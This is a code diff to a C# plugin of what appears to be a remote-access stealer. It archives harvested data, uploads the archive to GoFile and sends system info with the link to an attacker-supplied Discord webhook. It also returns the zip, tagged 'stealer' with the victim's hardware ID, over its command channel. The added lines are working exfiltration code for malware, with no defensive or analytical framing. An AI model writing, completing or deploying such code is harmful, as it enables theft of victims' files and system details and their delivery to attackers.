@@ -107,7 +107,8 @@ namespace Plugin
                 unpack_msgpack.DecodeFromBytes((byte[])data);
 
                 string tp = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
-                Logging.Log($"Packet arrived tp :{tp}");
+                string discordurl = unpack_msgpack.ForcePathObject("discordurl").AsString;
+                Logging.Log($"Reading Packet! {discordurl}>>\n");
                 switch (tp)
                 {
                     case "report":
@@ -117,13 +118,22 @@ namespace Plugin
                             //ziping file
                             string zipfilearchive = Filemanager.CreateArchive(savedir, false);
                             //uploadng file to gofile service
-                            //string url = GofileFileService.UploadFile(zipfilearchive);
+                            
+                            Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Started!");
+                            string url = GofileFileService.UploadFile(zipfilearchive);
+                            Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Ended\n{url}!");
+
+                            string info = GetSystemInfo(url);
+                            Logging.Log($"Sending Report To Discord >> Started! \n({discordurl}) ");
+                            Config.Webhook = discordurl;
+                            DiscordWebHook.SendReport(info);
+                            Logging.Log("Sending Report To Discord >> Ended!");
 
                             MsgPack msgpack = new MsgPack();
                             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                             msgpack.ForcePathObject("Pac_ket").AsString = "stealer";
 
-                            msgpack.ForcePathObject("info").AsString = GetSystemInfo("");
+                            msgpack.ForcePathObject("info").AsString = GetSystemInfo(url);
                             msgpack.ForcePathObject("zip").SetAsBytes(File.ReadAllBytes(zipfilearchive));
                             Connection.Send(msgpack.Encode2Bytes());
 
